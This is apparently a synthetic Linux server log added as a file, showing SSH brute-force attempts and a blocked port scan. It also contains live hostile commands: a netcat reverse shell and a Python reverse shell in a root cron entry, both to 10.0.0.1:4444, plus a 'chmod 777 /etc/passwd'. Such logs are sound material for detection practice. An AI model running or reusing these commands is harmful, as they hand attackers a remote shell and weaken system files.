@@ -1,0 +1,47 @@
+Oct 15 08:45:12 webserver sshd[12345]: Accepted password for admin from 192.168.1.50 port 22 ssh2
+Oct 15 08:45:30 webserver sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/whoami
+Oct 15 09:15:45 webserver sshd[12346]: Failed password for root from 203.0.113.15 port 22 ssh2
+Oct 15 09:15:47 webserver sshd[12347]: Failed password for root from 203.0.113.15 port 22 ssh2
+Oct 15 09:15:49 webserver sshd[12348]: Failed password for admin from 203.0.113.15 port 22 ssh2
+Oct 15 09:15:51 webserver sshd[12349]: Failed password for user from 203.0.113.15 port 22 ssh2
+Oct 15 09:15:53 webserver sshd[12350]: Failed password for test from 203.0.113.15 port 22 ssh2
+Oct 15 09:15:55 webserver sshd[12351]: Failed password for guest from 203.0.113.15 port 22 ssh2
+Oct 15 09:15:57 webserver sshd[12352]: Failed password for oracle from 203.0.113.15 port 22 ssh2
+Oct 15 09:15:59 webserver sshd[12353]: Failed password for postgres from 203.0.113.15 port 22 ssh2
+Oct 15 09:16:01 webserver sshd[12354]: Failed password for mysql from 203.0.113.15 port 22 ssh2
+Oct 15 09:30:22 webserver sshd[12355]: Accepted password for john from 192.168.1.45 port 22 ssh2
+Oct 15 09:31:15 webserver sudo: john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/bin/su -
+Oct 15 09:35:33 webserver sudo: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/nc -e /bin/sh 10.0.0.1 4444
+Oct 15 10:12:45 webserver sshd[12356]: Failed password for root from 198.51.100.25 port 22 ssh2
+Oct 15 10:12:47 webserver sshd[12357]: Failed password for admin from 198.51.100.25 port 22 ssh2
+Oct 15 10:12:49 webserver sshd[12358]: Failed password for user from 198.51.100.25 port 22 ssh2
+Oct 15 10:12:51 webserver sshd[12359]: Failed password for test from 198.51.100.25 port 22 ssh2
+Oct 15 10:12:53 webserver sshd[12360]: Failed password for guest from 198.51.100.25 port 22 ssh2
+Oct 15 10:45:10 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54321 DPT=22 
+Oct 15 10:45:11 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54322 DPT=80 
+Oct 15 10:45:12 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54323 DPT=443 
+Oct 15 10:45:13 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54324 DPT=21 
+Oct 15 10:45:14 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54325 DPT=23 
+Oct 15 10:45:15 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54326 DPT=25 
+Oct 15 10:45:16 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54327 DPT=53 
+Oct 15 10:45:17 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54328 DPT=110 
+Oct 15 10:45:18 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54329 DPT=143 
+Oct 15 10:45:19 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54330 DPT=993 
+Oct 15 10:45:20 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54331 DPT=995 
+Oct 15 10:45:21 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54332 DPT=1433 
+Oct 15 10:45:22 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54333 DPT=3389 
+Oct 15 10:45:23 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.10 DST=192.168.1.1 PROTO=TCP SPT=54334 DPT=5432 
+Oct 15 11:15:30 webserver sshd[12361]: Failed password for root from 203.0.113.15 port 22 ssh2
+Oct 15 11:15:32 webserver sshd[12362]: Failed password for admin from 203.0.113.15 port 22 ssh2
+Oct 15 11:15:34 webserver sshd[12363]: Failed password for user from 203.0.113.15 port 22 ssh2
+Oct 15 11:15:36 webserver sshd[12364]: Failed password for test from 203.0.113.15 port 22 ssh2
+Oct 15 11:22:10 webserver sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/chmod 777 /etc/passwd
+Oct 15 11:30:45 webserver sshd[12365]: Accepted password for service from 192.168.1.100 port 22 ssh2
+Oct 15 12:00:00 webserver cron[12366]: (root) CMD (/usr/bin/python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);")
+Oct 15 12:15:22 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.50 DST=192.168.1.1 PROTO=TCP SPT=12345 DPT=22
+Oct 15 12:15:23 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.50 DST=192.168.1.1 PROTO=TCP SPT=12346 DPT=22
+Oct 15 12:15:24 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.50 DST=192.168.1.1 PROTO=TCP SPT=12347 DPT=22
+Oct 15 12:15:25 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.50 DST=192.168.1.1 PROTO=TCP SPT=12348 DPT=22
+Oct 15 12:30:15 webserver sshd[12367]: Failed password for root from 203.0.113.30 port 22 ssh2
+Oct 15 12:30:17 webserver sshd[12368]: Failed password for admin from 203.0.113.30 port 22 ssh2
+Oct 15 12:30:19 webserver sshd[12369]: Failed password for user from 203.0.113.30 port 22 ssh2
